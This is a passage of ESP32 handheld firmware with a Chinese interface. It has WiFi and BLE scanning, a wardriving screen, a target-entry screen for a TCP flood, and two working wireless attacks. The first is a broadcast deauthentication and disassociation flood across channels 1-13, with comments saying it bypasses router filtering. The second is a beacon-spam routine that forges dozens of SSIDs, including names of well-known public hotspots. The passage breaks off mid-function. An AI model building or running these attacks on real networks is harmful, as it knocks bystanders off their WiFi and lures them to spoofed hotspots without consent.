    int n = WiFi.scanNetworks(false, true, false, 300, 0);
    
    if (n <= 0) {
        tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
        scr_draw_title("WiFi扫描");
        cnfont_print(4, CONTENT_Y + 16, "未发现网络", C_RED, C_BLACK);
        cnfont_print(4, CONTENT_Y + 32, "请重试或检查WiFi", C_DGRAY, C_BLACK);
        scr_draw_bottom("", "B:返回");
        while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) delay(20);
        WiFi.scanDelete();
        return;
    }
    
    int sel = 0;
    int scl = 0;
    int max_v = (CONTENT_H - 14) / ITEM_H - 1;
    bool need_redraw = true;
    
    while (true) {
        if (need_redraw) {
            need_redraw = false;
            tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
            scr_draw_title("WiFi扫描");
            
            int end = scl + max_v;
            if (end > n) end = n;
            for (int i = scl; i < end; i++) {
                int y = CONTENT_Y + 14 + (i - scl) * 10;
                if (i == sel) {
                    tft.fillRect(0, y, SCR_W, 10, C_DGRAY);
                    tft.setTextColor(C_WHITE, C_DGRAY);
                    tft.setCursor(4, y + 1);
                    tft.print("> ");
                } else {
                    tft.setTextColor(C_WHITE, C_BLACK);
                    tft.setCursor(4, y + 1);
                    tft.print("  ");
                }
                char buf[22];
                String ssid = WiFi.SSID(i);
                bool has_non_ascii = false;
                for (size_t j = 0; j < ssid.length(); j++) {
                    if ((uint8_t)ssid[j] > 127) { has_non_ascii = true; break; }
                }
                scr_clip_text(buf, has_non_ascii ? "[UTF-8]" : ssid.c_str(), 14);
                tft.print(buf);
                
                int r = WiFi.RSSI(i);
                uint16_t c = (r > -50) ? C_SGREEN : (r > -70) ? C_YELLOW : C_RED;
                tft.setTextColor(c, C_BLACK);
                tft.setCursor(110, y + 1);
                tft.print(r);
                tft.print("dB");
                
                tft.setTextColor(C_DGRAY, C_BLACK);
                tft.setCursor(SCR_W - 20, y + 1);
                tft.print("CH");
                tft.print(WiFi.channel(i));
            }
            
            scr_draw_bottom("A:详情", "B:返回");
        }
        
        ButtonEvent u = buttons_get_event(BTN_ID_UP);
        ButtonEvent d = buttons_get_event(BTN_ID_DOWN);
        if (u == BTN_EVENT_PRESS && sel > 0) { sel--; need_redraw = true; }
        if (d == BTN_EVENT_PRESS && sel < n - 1) { sel++; need_redraw = true; }
        if (sel < scl) { scl = sel; need_redraw = true; }
        if (sel >= scl + max_v) { scl = sel - max_v + 1; need_redraw = true; }
        if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) break;
        if (buttons_get_event(BTN_ID_A) == BTN_EVENT_PRESS) {
            // Detail view
            tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
            scr_draw_title("热点详情");
            tft.setTextFont(1);
            tft.setTextColor(C_WHITE, C_BLACK);
            tft.setCursor(4, CONTENT_Y + 14); tft.print("SSID: "); tft.print(WiFi.SSID(sel));
            tft.setCursor(4, CONTENT_Y + 26); tft.print("BSSID: ");
            uint8_t* b = WiFi.BSSID(sel);
            if (b) {
                char mac[18];
                snprintf(mac, 18, "%02X:%02X:%02X:%02X:%02X:%02X", b[0],b[1],b[2],b[3],b[4],b[5]);
                tft.print(mac);
            } else {
                tft.print("N/A");
            }
            tft.setCursor(4, CONTENT_Y + 38); tft.print("CH: "); tft.print(WiFi.channel(sel));
            tft.setCursor(4, CONTENT_Y + 50); tft.print("RSSI: "); tft.print(WiFi.RSSI(sel));
            tft.setCursor(4, CONTENT_Y + 62); tft.print("Enc: ");
            switch (WiFi.encryptionType(sel)) {
                case WIFI_AUTH_OPEN: tft.print("Open"); break;
                case WIFI_AUTH_WEP: tft.print("WEP"); break;
                case WIFI_AUTH_WPA_PSK: tft.print("WPA"); break;
                case WIFI_AUTH_WPA2_PSK: tft.print("WPA2"); break;
                case WIFI_AUTH_WPA_WPA2_PSK: tft.print("WPA2"); break;
                default: tft.print("WPA3"); break;
            }
            scr_draw_bottom("", "B:返回");
            while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) delay(20);
            need_redraw = true;
        }
        delay(30);
    }
    WiFi.scanDelete();
}

// ═══════════════ RECON: BLE Scan ═══════════════
static void recon_ble() {
    g_ble_on = true;
    // ── Always restore screen first to prevent black screen ──
    tft_soft_restore();
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("蓝牙扫描");
    tft.setTextFont(1);
    cnfont_print(4, CONTENT_Y + 16, "扫描中...", C_CYAN, C_BLACK);
    cnfont_print(4, CONTENT_Y + 32, "10秒扫描...", C_DGRAY, C_BLACK);
    
    NimBLEScan* scan = NimBLEDevice::getScan();
    scan->setActiveScan(false);
    scan->setInterval(160);
    scan->setWindow(160);
    
    // Use shorter scan time (10s instead of 30s) to prevent watchdog/screen issues
    scan->start(10, false);
    scan->stop();
    
    // Restore screen after BLE scan completes (BLE can disrupt display)
    tft_soft_restore();
    
    NimBLEScanResults results = scan->getResults(); int n = results.getCount();
    
    if (n == 0) {
        tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
        scr_draw_title("蓝牙扫描");
        cnfont_print(4, CONTENT_Y + 16, "未发现蓝牙设备", C_RED, C_BLACK);
        scr_draw_bottom("", "B:返回");
        while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) delay(20);
        scan->clearResults();
        return;
    }
    
    int sel = 0, scl = 0;
    int max_v = (CONTENT_H - 14) / 10 - 1;
    bool need_redraw = true;
    
    while (true) {
        if (need_redraw) {
            need_redraw = false;
            tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
            scr_draw_title("蓝牙扫描");

            int end = scl + max_v;
            if (end > n) end = n;
            for (int i = scl; i < end; i++) {
                int y = CONTENT_Y + 14 + (i - scl) * 10;
                if (i == sel) {
                    tft.fillRect(0, y, SCR_W, 10, C_DGRAY);
                    tft.setTextColor(C_WHITE, C_DGRAY);
                    tft.setCursor(4, y + 1);
                    tft.print("> ");
                } else {
                    tft.setTextColor(C_WHITE, C_BLACK);
                    tft.setCursor(4, y + 1);
                    tft.print("  ");
                }
                const NimBLEAdvertisedDevice* d = results.getDevice(i);
                if (!d) continue;
                char buf[22];
                String name = d->getName().length() > 0 ? String(d->getName().c_str()) : "Unknown";
                scr_clip_text(buf, name.c_str(), 14);
                tft.print(buf);
                
                int r = d->getRSSI();
                uint16_t c = (r > -50) ? C_SGREEN : (r > -70) ? C_YELLOW : C_RED;
                tft.setTextColor(c, C_BLACK);
                tft.setCursor(110, y + 1);
                tft.print(r);
            }
            
            scr_draw_bottom("A:详情", "B:返回");
        }

        ButtonEvent u = buttons_get_event(BTN_ID_UP);
        ButtonEvent d = buttons_get_event(BTN_ID_DOWN);
        if (u == BTN_EVENT_PRESS && sel > 0) { sel--; need_redraw = true; }
        if (d == BTN_EVENT_PRESS && sel < n - 1) { sel++; need_redraw = true; }
        if (sel < scl) { scl = sel; need_redraw = true; }
        if (sel >= scl + max_v) { scl = sel - max_v + 1; need_redraw = true; }
        if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) break;
        if (buttons_get_event(BTN_ID_A) == BTN_EVENT_PRESS) {
            const NimBLEAdvertisedDevice* d = results.getDevice(sel);
            tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
            scr_draw_title("蓝牙详情");
            tft.setTextFont(1);
            tft.setTextColor(C_WHITE, C_BLACK);
            tft.setCursor(4, CONTENT_Y + 14);
            tft.print("SSID: "); tft.print(d->getName().length() > 0 ? d->getName().c_str() : "N/A");
            tft.setCursor(4, CONTENT_Y + 26);
            tft.print("MAC: "); tft.print(d->getAddress().toString().c_str());
            tft.setCursor(4, CONTENT_Y + 38);
            tft.print("RSSI: "); tft.print(d->getRSSI());
            tft.setCursor(4, CONTENT_Y + 50);
            tft.print("Type: "); tft.print(d->getAdvType());
            scr_draw_bottom("", "B:返回");
            while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) delay(20);
            need_redraw = true;
        }
        delay(30);
    }
    scan->clearResults();
}

// ═══════════════ RECON: Wardrive — anti-flicker ═══════════════
static void recon_wardrive() {
    // ── Always restore screen first to prevent black screen ──
    tft_soft_restore();

    if (g_wifi_mode == WM_OFF) {
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        g_wifi_mode = WM_STA;
        delay(100);  // Let radio initialize
        tft_soft_restore();
    }
    
    // Draw static layout once
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("战驾扫描");

    // Static labels
    cnfont_print(4, CONTENT_Y + 16, "信道:", C_WHITE, C_BLACK);
    cnfont_print(4, CONTENT_Y + 32, "发现:", C_WHITE, C_BLACK);
    cnfont_print(4, CONTENT_Y + 48, "总计:", C_WHITE, C_BLACK);

    cnfont_print(4, SCR_H - 22, "B:停止", C_RED, C_BLACK);

    // Progress bar frame (static)
    int bar_w = 140;
    tft.drawRect(8, CONTENT_Y + 68, bar_w, 8, C_DGRAY);
    
    int total = 0;
    int last_ch = 0;
    int last_n = 0;
    int last_total = 0;
    
    while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) {
        if (buttons_is_pressed(BTN_ID_B)) break;
        for (int ch = 1; ch <= 13; ch++) {
            if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) break;
            if (buttons_is_pressed(BTN_ID_B)) break;
            // Scan ONLY the current channel (was always scanning ch 1 — bug fix)
            int n = WiFi.scanNetworks(false, true, false, 300, ch);
            total += n;
            
            // Only update changed values
            if (ch != last_ch) {
                tft.fillRect(44, CONTENT_Y + 16, 24, 10, C_BLACK);
                tft.setTextColor(C_CYAN, C_BLACK);
                tft.setCursor(44, CONTENT_Y + 16);
                tft.print(ch);
                last_ch = ch;
            }
            if (n != last_n) {
                tft.fillRect(44, CONTENT_Y + 32, 40, 10, C_BLACK);
                tft.setTextColor(C_YELLOW, C_BLACK);
                tft.setCursor(44, CONTENT_Y + 32);
                tft.print(n);
                last_n = n;
            }
            if (total != last_total) {
                tft.fillRect(44, CONTENT_Y + 48, 60, 10, C_BLACK);
                tft.setTextColor(C_WHITE, C_BLACK);
                tft.setCursor(44, CONTENT_Y + 48);
                tft.print(total);
                last_total = total;
            }

            // Update progress bar
            tft.fillRect(9, CONTENT_Y + 69, bar_w - 2, 6, C_BLACK);
            tft.fillRect(9, CONTENT_Y + 69, (bar_w - 2) * ch / 13, 6, C_CYAN);
            
            WiFi.scanDelete();
            delay(100);
        }
    }
}

// ═══════════════ TRAFFIC GRAPH VISUALIZER (Data Cockpit Style) ═══════════════
// Scrolling real-time waveform graph inspired by dark-themed BI dashboards
// Dark navy bg, cyan waveform, grid lines, digital readouts

#define GRAPH_SAMPLES 58   // 58 samples × 2px = 116px wide
#define GRAPH_W       116
#define GRAPH_H       30

struct TrafficGraph {
    int samples[GRAPH_SAMPLES];
    int head;
    int max_val;

    void init() {
        memset(samples, 0, sizeof(samples));
        head = 0;
        max_val = 50;
    }

    void push(int val) {
        samples[head] = val;
        head = (head + 1) % GRAPH_SAMPLES;
        if (val > max_val) max_val = val;
        // Slowly decay max for auto-scaling
        if (max_val > 100) max_val = max_val * 95 / 100;
    }

    void draw(int x, int y) {
        // Dark navy background
        tft.fillRect(x, y, GRAPH_W, GRAPH_H, 0x0300);

        // Grid lines (faint blue)
        for (int i = 1; i < 4; i++) {
            int gy = y + (GRAPH_H * i / 4);
            tft.drawFastHLine(x, gy, GRAPH_W, 0x1082);
        }
        for (int i = 1; i < 6; i++) {
            int gx = x + (GRAPH_W * i / 6);
            tft.drawFastVLine(gx, y, GRAPH_H, 0x1082);
        }

        // Scrolling waveform — area fill + line
        int prev_y = y + GRAPH_H;
        for (int i = 0; i < GRAPH_SAMPLES; i++) {
            int idx = (head + i) % GRAPH_SAMPLES;
            int val = samples[idx];
            int py = y + GRAPH_H - (val * (GRAPH_H - 2) / (max_val > 0 ? max_val : 1));
            if (py < y + 1) py = y + 1;
            if (py > y + GRAPH_H - 1) py = y + GRAPH_H - 1;
            int px = x + i * 2;

            if (i > 0) {
                // Filled area under curve (dim cyan)
                tft.drawLine(px - 2, prev_y, px, py, 0x2408);
                tft.drawLine(px - 2, prev_y + 1, px, py + 1, 0x1804);
                // Bright line on top
                tft.drawLine(px - 2, prev_y, px, py, 0x07FF);  // C_CYAN
            }
            prev_y = py;
        }

        // Border glow
        tft.drawRect(x - 1, y - 1, GRAPH_W + 2, GRAPH_H + 2, 0x4208);
    }
};

// ═══════════════ IP/PORT INPUT (for TCP Flood) ═══════════════
// UP/DOWN: change digit, LEFT/RIGHT: move cursor, A: confirm, B: cancel
static bool input_ip_port(char* out_ip, int* out_port) {
    int octets[4] = {192, 168, 1, 1};
    int port = 80;
    int sel = 0;  // 0-3=octets, 4=port

    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, 0x0300);
    scr_draw_title("TCP Target");
    tft.setTextFont(1);

    tft.setTextColor(0x8410, 0x0300);  // muted blue-gray
    tft.setCursor(4, CONTENT_Y + 16);
    tft.print("Target IP / Port");

    tft.setTextColor(0x07FF, 0x0300);  // cyan
    tft.setCursor(4, CONTENT_Y + 40);
    tft.print("IP:");

    tft.setTextColor(0xFFE0, 0x0300);  // yellow
    tft.setCursor(4, CONTENT_Y + 56);
    tft.print("PORT:");

    tft.setTextColor(0x8410, 0x0300);
    tft.setCursor(4, CONTENT_Y + 76);
    tft.print("U/D:+-  L/R:sel");
    tft.setCursor(4, CONTENT_Y + 88);
    tft.print("A:OK  B:Cancel");

    while (true) {
        // Draw IP octets
        for (int i = 0; i < 4; i++) {
            int ox = 28 + i * 28;
            tft.fillRect(ox, CONTENT_Y + 40, 24, 10, 0x0300);
            if (sel == i) {
                tft.setTextColor(0x07E0, 0x0300);  // green = active
                tft.drawRect(ox - 1, CONTENT_Y + 39, 26, 12, 0x07E0);
            } else {
                tft.setTextColor(0xFFFF, 0x0300);  // white
            }
            tft.setCursor(ox, CONTENT_Y + 40);
            tft.print(octets[i]);
            if (i < 3) {
                tft.setTextColor(0x8410, 0x0300);
                tft.setCursor(ox + 22, CONTENT_Y + 40);
                tft.print(".");
            }
        }

        // Draw port
        tft.fillRect(40, CONTENT_Y + 56, 48, 10, 0x0300);
        if (sel == 4) {
            tft.setTextColor(0x07E0, 0x0300);
            tft.drawRect(39, CONTENT_Y + 55, 50, 12, 0x07E0);
        } else {
            tft.setTextColor(0xFFFF, 0x0300);
        }
        tft.setCursor(40, CONTENT_Y + 56);
        tft.print(port);

        // Handle input
        if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) {
            buzzer_click();
            return false;
        }
        if (buttons_get_event(BTN_ID_A) == BTN_EVENT_PRESS) {
            buzzer_click();
            snprintf(out_ip, 16, "%d.%d.%d.%d", octets[0], octets[1], octets[2], octets[3]);
            *out_port = port;
            return true;
        }
        if (buttons_get_event(BTN_ID_LEFT) == BTN_EVENT_PRESS) {
            buzzer_click();
            sel--;
            if (sel < 0) sel = 4;
        }
        if (buttons_get_event(BTN_ID_RIGHT) == BTN_EVENT_PRESS) {
            buzzer_click();
            sel++;
            if (sel > 4) sel = 0;
        }
        if (buttons_get_event(BTN_ID_UP) == BTN_EVENT_PRESS) {
            buzzer_click();
            if (sel < 4) { octets[sel]++; if (octets[sel] > 255) octets[sel] = 0; }
            else { port += 10; if (port > 65535) port = 1; }
        }
        if (buttons_get_event(BTN_ID_DOWN) == BTN_EVENT_PRESS) {
            buzzer_click();
            if (sel < 4) { octets[sel]--; if (octets[sel] < 0) octets[sel] = 255; }
            else { port -= 10; if (port < 1) port = 65535; }
        }
        delay(30);
    }
}

// ═══════════════ ATTACK: Deauth — Data Cockpit visualization ═══════════════
static void attk_deauth() {
    if (g_wifi_mode == WM_OFF) {
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        g_wifi_mode = WM_STA;
        tft_soft_restore();
    }
    
    g_wifi_atk = ATK_ARMED;
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("断连攻击");

    // Info panel
    tft.drawRect(2, CONTENT_Y + 14, SCR_W - 4, 60, C_DGRAY);
    tft.setTextFont(1);
    cnfont_print(4, CONTENT_Y + 18, "模式: 断连洪泛", C_CYAN, C_BLACK);
    cnfont_print(4, CONTENT_Y + 34, "目标:全部WiFi设备", C_YELLOW, C_BLACK);
    cnfont_print(4, CONTENT_Y + 50, "全信道广播 约65包/秒", C_DGRAY, C_BLACK);
    cnfont_print(4, CONTENT_Y + 66, "A:开始  B:返回", C_WHITE, C_BLACK);
    
    while (true) {
        if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) {
            g_wifi_atk = ATK_OFF;
            buzzer_click();
            return;
        }
        if (buttons_get_event(BTN_ID_A) == BTN_EVENT_PRESS) {
            buzzer_click();
            g_wifi_atk = ATK_RUNNING;
            
            // ── Dashboard layout (dark cockpit style) ──
            tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, 0x0300);
            scr_draw_title("断连攻击 [运行中]");
            tft.setTextFont(1);
            
            // Top info bar: MODE + TGT
            tft.setTextColor(0xFFE0, 0x0300);  // yellow
            tft.setCursor(2, CONTENT_Y + 14);
            tft.print("DEAUTH");
            tft.setTextColor(0x8410, 0x0300);  // muted
            tft.setCursor(50, CONTENT_Y + 14);
            tft.print("TGT:All CH");
            
            // Traffic graph area (y=26..58)
            TrafficGraph graph;
            graph.init();
            
            // Bottom digital readouts
            tft.drawFastHLine(2, CONTENT_Y + 60, SCR_W - 4, 0x1082);
            tft.setTextColor(0x8410, 0x0300);
            cnfont_print(2, CONTENT_Y + 64, "信道:", 0x8410, 0x0300);
            cnfont_print(2, CONTENT_Y + 76, "速率:", 0x8410, 0x0300);
            tft.setCursor(2, CONTENT_Y + 88);
            tft.print("TX:");
            tft.setTextColor(0xFFE0, 0x0300);
            cnfont_print(60, CONTENT_Y + 64, "总包:", 0xFFE0, 0x0300);
            cnfont_print(60, CONTENT_Y + 76, "传输:", 0xFFE0, 0x0300);
            cnfont_print(60, CONTENT_Y + 88, "帧型:", 0xFFE0, 0x0300);
            
            cnfont_print(4, SCR_H - 16, "B:停止", 0xF800, 0x0300);
            
            uint32_t rate_last_pkt = g_packets_sent;
            uint32_t rate_last_ms = millis();
            uint32_t last_pps = 999, last_total = 999, last_ch = 99, last_tx = 99, last_fr = 99;
            int cur_ch = 1;
            
            // Deauth frame (0xC0)
            uint8_t deauth_pkt[26];
            memset(deauth_pkt, 0, 26);
            deauth_pkt[0] = 0xC0; deauth_pkt[1] = 0x00;
            deauth_pkt[2] = 0x3A; deauth_pkt[3] = 0x01;
            memset(deauth_pkt + 4, 0xFF, 6);
            for (int i = 0; i < 6; i++) deauth_pkt[10 + i] = random(256);
            for (int i = 0; i < 6; i++) deauth_pkt[16 + i] = random(256);
            deauth_pkt[24] = DEAUTH_REASON;
            deauth_pkt[25] = 0x00;
            
            // Disassociation frame (0xA0) — bypasses deauth filtering on high-end routers
            uint8_t disassoc_pkt[26];
            memcpy(disassoc_pkt, deauth_pkt, 26);
            disassoc_pkt[0] = 0xA0;
            
            // Deauth with AP spoof (directed, for WiFi6 routers that filter bcast)
            uint8_t deauth_directed[26];
            memcpy(deauth_directed, deauth_pkt, 26);
            
            uint32_t frame_counter = 0;
            
            while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) {
                if (buttons_is_pressed(BTN_ID_B)) break;
                for (int ch = 1; ch <= 13; ch++) {
                    if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) break;
                    if (buttons_is_pressed(BTN_ID_B)) break;
                    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
                    cur_ch = ch;
                    for (int k = 0; k < 8; k++) {
                        // Rotate frame types: deauth → disassoc → deauth (high-end router bypass)
                        if (frame_counter % 3 == 0) {
                            esp_wifi_80211_tx(WIFI_IF_STA, deauth_pkt, 26, false);
                        } else if (frame_counter % 3 == 1) {
                            esp_wifi_80211_tx(WIFI_IF_STA, disassoc_pkt, 26, false);
                        } else {
                            // Directed deauth (spoofed BSSID for targeted attack)
                            for (int i = 0; i < 6; i++) deauth_directed[10 + i] = random(256);
                            esp_wifi_80211_tx(WIFI_IF_STA, deauth_directed, 26, false);
                        }
                        g_packets_sent++;
                        g_traffic_tx += 26;
                        frame_counter++;
                    }
                    delay(5);
                }
                
                uint32_t now_ms = millis();
                
                // Rate calculation every 500ms
                if (now_ms - rate_last_ms >= 500) {
                    uint32_t pps = (g_packets_sent - rate_last_pkt) * 2;
                    rate_last_pkt = g_packets_sent;
                    rate_last_ms = now_ms;
                    graph.push(pps);
                    graph.draw(20, CONTENT_Y + 26);
                    
                    // Update digital readouts
                    if (pps != last_pps) {
                        tft.fillRect(42, CONTENT_Y + 76, 18, 8, 0x0300);
                        tft.setTextColor(pps > 200 ? 0xF800 : 0x07FF, 0x0300);
                        tft.setCursor(42, CONTENT_Y + 76);
                        tft.print(pps);
                        last_pps = pps;
                    }
                }
                
                // Channel
                if (cur_ch != last_ch) {
                    tft.fillRect(42, CONTENT_Y + 64, 18, 8, 0x0300);
                    tft.setTextColor(0x07FF, 0x0300);
                    tft.setCursor(42, CONTENT_Y + 64);
                    tft.print(cur_ch);
                    last_ch = cur_ch;
                }
                
                // Total packets
                if (g_packets_sent != last_total) {
                    tft.fillRect(100, CONTENT_Y + 64, 48, 8, 0x0300);
                    tft.setTextColor(0xFFE0, 0x0300);
                    tft.setCursor(100, CONTENT_Y + 64);
                    tft.print(g_packets_sent);
                    last_total = g_packets_sent;
                    
                    // TX KB
                    uint32_t tx_kb = (g_packets_sent * 26) / 1024;
                    tft.fillRect(100, CONTENT_Y + 76, 48, 8, 0x0300);
                    tft.setTextColor(0xFFE0, 0x0300);
                    tft.setCursor(100, CONTENT_Y + 76);
                    tft.print(tx_kb);
                    last_tx = tx_kb;
                }
                
                // Frame types
                if (frame_counter / 100 != last_fr) {
                    tft.fillRect(100, CONTENT_Y + 88, 48, 8, 0x0300);
                    tft.setTextColor(0x07E0, 0x0300);  // green
                    tft.setCursor(100, CONTENT_Y + 88);
                    tft.print("D+D+T");
                    last_fr = frame_counter / 100;
                }
                
                delay(30);
            }
            g_wifi_atk = ATK_OFF;
            buzzer_click();
            return;
        }
        delay(30);
    }
}

// ═══════════════ ATTACK: Beacon Spam — progress-bar visualization ═══════════════
static const char* beacon_ssids[] = {
    "Starbucks WiFi", "McDonalds Free", "Airport WiFi",
    "Free Public WiFi", "Xfinity WiFi", "attwifi",
    "Google Starbucks", "NETGEAR", "Linksys",
    "T-Mobile Hotspot", "Verizon WiFi", "CableWiFi",
    "optimumwifi", "Boingo Hotspot", "CenturyLink",
    "Spectrum WiFi", "Cox WiFi", "BTWiFi",
    "SKYNET", "FBI Van", "NSA Surveillance",
    "Pretty Fly", "Get Off My LAN", "It hurts when IP",
    "Martin Router King", "The Promised LAN",
    "WiFi Art Thou Romeo", "Hide Yo Kids Hide Yo WiFi",
    "The LAN Before Time", "Nacho WiFi",
    "Silence of the LANs", "No Free WiFi Here",
    "WiFi So Serious", "Tell My WiFi Love Her",
    "Wu Tang LAN", "Bill Wi the Science Fi",
    "Troy and Abed in the Modem", "The Ping in the North",
    "Dora the Internet Explorer", "I Believe Wi Can Fi",
    "This LAN is My LAN"
};
static int beacon_count = sizeof(beacon_ssids) / sizeof(beacon_ssids[0]);

static void attk_beacon() {
    if (g_wifi_mode == WM_OFF) {
        WiFi.mode(WIFI_AP);
        g_wifi_mode = WM_AP;
        tft_soft_restore();
    }
    
    g_wifi_atk = ATK_ARMED;
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("信标洪泛");
    
    // Info panel
    tft.drawRect(2, CONTENT_Y + 14, SCR_W - 4, 60, C_DGRAY);
    tft.setTextFont(1);
    cnfont_print(4, CONTENT_Y + 18, "模式: SSID洪泛", C_CYAN, C_BLACK);
    cnfont_print(4, CONTENT_Y + 34, "目标:所有WiFi区域", C_YELLOW, C_BLACK);
    {
        char bcn_buf[40];
        snprintf(bcn_buf, sizeof(bcn_buf), "伪造SSID:%d 信道1-13", beacon_count);
        cnfont_print(4, CONTENT_Y + 50, bcn_buf, C_DGRAY, C_BLACK);
    }
    cnfont_print(4, CONTENT_Y + 66, "A:开始  B:返回", C_WHITE, C_BLACK);
    
    while (true) {
        if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) {
            g_wifi_atk = ATK_OFF;
            buzzer_click();
            return;
        }
        if (buttons_get_event(BTN_ID_A) == BTN_EVENT_PRESS) {
            buzzer_click();
            g_wifi_atk = ATK_RUNNING;
            
            // ── Dashboard layout ──
            tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, 0x0300);
            scr_draw_title("信标洪泛 [运行中]");
            tft.setTextFont(1);
            
            tft.setTextColor(0xFFE0, 0x0300);
            tft.setCursor(2, CONTENT_Y + 14);
            tft.print("BCN");
            tft.setTextColor(0x8410, 0x0300);
            tft.setCursor(30, CONTENT_Y + 14);
            tft.print("SSID:");
            tft.print(beacon_count);
            tft.setCursor(80, CONTENT_Y + 14);
            tft.print("CH:1-13");
            
            TrafficGraph graph;
            graph.init();
            
            tft.drawFastHLine(2, CONTENT_Y + 60, SCR_W - 4, 0x1082);
            tft.setTextColor(0x8410, 0x0300);
            cnfont_print(2, CONTENT_Y + 64, "信道:", 0x8410, 0x0300);
            cnfont_print(2, CONTENT_Y + 76, "速率:", 0x8410, 0x0300);
            tft.setCursor(2, CONTENT_Y + 88);
            tft.print("TX:");
            tft.setTextColor(0xFFE0, 0x0300);
            cnfont_print(60, CONTENT_Y + 64, "总包:", 0xFFE0, 0x0300);
            cnfont_print(60, CONTENT_Y + 76, "传输:", 0xFFE0, 0x0300);
            tft.setCursor(60, CONTENT_Y + 88);
            tft.print("ID:");
            
            cnfont_print(4, SCR_H - 16, "B:停止", 0xF800, 0x0300);
            
            uint32_t rate_last_beacon = g_beacons_sent;
            uint32_t rate_last_ms = millis();
            uint32_t last_pps = 999, last_total = 999, last_ch = 99, last_tx = 99, last_id = 99;
            int cur_ch = 1;
            
            while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) {
                if (buttons_is_pressed(BTN_ID_B)) break;
                for (int i = 0; i < beacon_count; i++) {
                    if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) break;
                    if (buttons_is_pressed(BTN_ID_B)) break;
                    for (int ch = 1; ch <= 13; ch++) {
                        if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) break;
                        if (buttons_is_pressed(BTN_ID_B)) break;
                        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
                        cur_ch = ch;
                        
                        uint8_t beacon[128];
                        int len = 0;
                        beacon[len++] = 0x80; beacon[len++] = 0x00;
                        beacon[len++] = 0x00; beacon[len++] = 0x00;
                        memset(beacon + len, 0xFF, 6); len += 6;
                        for (int j = 0; j < 6; j++) beacon[len++] = random(256);
                        memcpy(beacon + len, beacon + 10, 6); len += 6;
                        beacon[len++] = random(256); beacon[len++] = random(256);
                        for (int j = 0; j < 8; j++) beacon[len++] = 0;
                        beacon[len++] = 0x64; beacon[len++] = 0x00;
                        beacon[len++] = 0x31; beacon[len++] = 0x04;
                        int slen = strlen(beacon_ssids[i]);
                        beacon[len++] = 0x00;
                        beacon[len++] = slen;
                        memcpy(beacon + len, beacon_ssids[i], slen);
                        len += slen;
                        beacon[len++] = 0x01; beacon[len++] = 0x08;
                        beacon[len++] = 0x82; beacon[len++] = 0x84;
                        beacon[len++] = 0x8B; beacon[len++] = 0x96;
                        beacon[len++] = 0x24; beacon[len++] = 0x30;
                        beacon[len++] = 0x48; beacon[len++] = 0x6C;
                        beacon[len++] = 0x03; beacon[len++] = 0x01;
                        beacon[len++] = ch;
                        
                        esp_wifi_80211_tx(WIFI_IF_AP, beacon, len, false);
                        g_beacons_sent++;
                        g_traffic_tx += len;
                        delay(5);
                    }
                }
                
                uint32_t now_ms = millis();
                
                if (now_ms - rate_last_ms >= 500) {
                    uint32_t pps = (g_beacons_sent - rate_last_beacon) * 2;
                    rate_last_beacon = g_beacons_sent;
                    rate_last_ms = now_ms;
                    graph.push(pps);
                    graph.draw(20, CONTENT_Y + 26);
                    
                    if (pps != last_pps) {
                        tft.fillRect(42, CONTENT_Y + 76, 18, 8, 0x0300);
                        tft.setTextColor(pps > 200 ? 0xF800 : 0x07FF, 0x0300);
                        tft.setCursor(42, CONTENT_Y + 76);
                        tft.print(pps);
                        last_pps = pps;
                    }
                }
                
                if (cur_ch != last_ch) {
                    tft.fillRect(42, CONTENT_Y + 64, 18, 8, 0x0300);
                    tft.setTextColor(0x07FF, 0x0300);
                    tft.setCursor(42, CONTENT_Y + 64);
                    tft.print(cur_ch);
                    last_ch = cur_ch;
                }
                
                if (g_beacons_sent != last_total) {
                    tft.fillRect(100, CONTENT_Y + 64, 48, 8, 0x0300);
                    tft.setTextColor(0xFFE0, 0x0300);
                    tft.setCursor(100, CONTENT_Y + 64);
                    tft.print(g_beacons_sent);
                    last_total = g_beacons_sent;
                    
                    uint32_t tx_kb = (g_beacons_sent * 128) / 1024;
                    tft.fillRect(100, CONTENT_Y + 76, 48, 8, 0x0300);
                    tft.setTextColor(0xFFE0, 0x0300);
                    tft.setCursor(100, CONTENT_Y + 76);
                    tft.print(tx_kb);
                    last_tx = tx_kb;
                }
                
                int cur_id = (g_beacons_sent % beacon_count);
                if (cur_id != last_id) {
                    tft.fillRect(100, CONTENT_Y + 88, 48, 8, 0x0300);
                    tft.setTextColor(0x07E0, 0x0300);
